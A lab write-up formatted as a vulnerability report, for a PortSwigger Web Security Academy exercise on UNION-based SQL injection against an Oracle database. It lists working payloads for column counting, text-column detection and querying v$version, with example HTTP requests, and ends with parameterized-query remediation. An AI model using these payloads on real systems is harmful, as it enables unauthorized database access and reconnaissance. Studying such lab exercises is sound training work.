
---
# SQL Injection in Product Filtering allows Database Type and Version Enumeration

## 1. Executive Summary

A SQL injection vulnerability exists in the application's product filtering functionality, where user-controlled input is incorporated into a backend SQL query without proper parameterization. By determining the number of columns returned by the query and identifying a text-compatible column, an attacker can use a `UNION SELECT` statement to query Oracle-specific database metadata and retrieve the database type and version.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection (SQLi) — Database Type and Version Enumeration
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application uses the `category` parameter in a SQL query similar to:

```
SELECT * FROM products
WHERE category = 'Gifts';
```

Because the parameter is incorporated into the SQL statement without parameterization, an attacker can inject additional SQL syntax.

The exploitation requires determining the structure of the original query before using `UNION SELECT`. Once the number of columns and a text-compatible column are identified, Oracle's `v$version` view can be queried to retrieve database version information.

## 3. Steps to Reproduce (STR)

### Step 1 — Identify the SQL injection point

1. Access the PortSwigger lab.
    
2. Navigate to the product filtering functionality.
    
3. Select a product category.
    
4. Intercept the request using Burp Suite.
    
5. Identify the `category` parameter.
    
6. Test the parameter with a SQL injection payload such as:
    

```
' OR 1=1--
```

7. Observe that the application's response changes, indicating that the parameter is potentially vulnerable to SQL injection.
    

### Step 2 — Determine the number of columns

8. Test the number of columns using `ORDER BY`:
    

```
' ORDER BY 1--
```

9. Increase the column number:
    

```
' ORDER BY 2--
```

10. Continue incrementing:
    

```
' ORDER BY 3--
```

11. Observe the responses.
    
12. If `ORDER BY 1--` and `ORDER BY 2--` succeed but `ORDER BY 3--` produces an error, the underlying query contains **2 columns**.
    

An alternative method is to use `UNION SELECT` with increasing numbers of `NULL` values:

```
' UNION SELECT NULL--
```

```
' UNION SELECT NULL,NULL--
```

```
' UNION SELECT NULL,NULL,NULL--
```

The number of `NULL` values that produces a successful response corresponds to the number of columns returned by the original query.

### Step 3 — Identify a text-compatible column

13. Assuming the query contains two columns, test the first column:
    

```
' UNION SELECT 'test',NULL--
```

14. Then test the second column:
    

```
' UNION SELECT NULL,'test'--
```

15. Observe which request successfully displays the `test` value in the application response.
    
16. This identifies a column that can accept and display string data.
    

### Step 4 — Query the Oracle database version

17. Once the column count and text-compatible column are known, use Oracle's `v$version` view.
    
18. If the first column is text-compatible, use:
    

```
' UNION SELECT banner,NULL FROM v$version--
```

19. If the second column is text-compatible, use:
    

```
' UNION SELECT NULL,banner FROM v$version--
```

20. Send the request.
    
21. Observe the response containing Oracle database version information.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

The exact request depends on the lab's parameter structure. Conceptually, the vulnerable request is:

```
GET /filter?category=<SQL_INJECTION_PAYLOAD> HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### Column-count enumeration

Example:

```
GET /filter?category=%27+ORDER+BY+2-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

If two columns are confirmed, test the text-compatible columns:

```
GET /filter?category=%27+UNION+SELECT+%27test%27,NULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

If the first column is suitable for displaying text, query Oracle's version information:

```
GET /filter?category=%27+UNION+SELECT+banner,NULL+FROM+v%24version-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The resulting SQL is conceptually:

```
SELECT * FROM products
WHERE category = ''
UNION
SELECT banner, NULL
FROM v$version
--';
```

The response contains information similar to:

```
Oracle Database 19c Enterprise Edition Release ...
```

The exact version string depends on the database instance used by the PortSwigger lab.

### Evidence (Screenshots/Video)



## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can exploit SQL injection to manipulate the application's database query. After determining the query structure, the attacker can execute a `UNION SELECT` statement against Oracle's `v$version` view and retrieve database version information.
    
- **Business Impact:** Disclosure of the database technology and version provides useful information for further attack development. An attacker can use the database fingerprint to select database-specific SQL syntax and investigate vulnerabilities associated with the identified database version. The demonstrated impact in this lab is database type and version disclosure.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for all SQL operations involving user-controlled input. User input must be treated strictly as data and must never be concatenated directly into SQL statements.
    

For example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = :category",
    {"category": category}
)
```

Additional security measures include:

- Use prepared statements or parameterized queries.
    
- Avoid dynamically constructing SQL queries using user-controlled input.
    
- Apply least-privilege permissions to the application's database account.
    
- Avoid exposing database errors and internal database information to users.
    
- Perform appropriate server-side input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection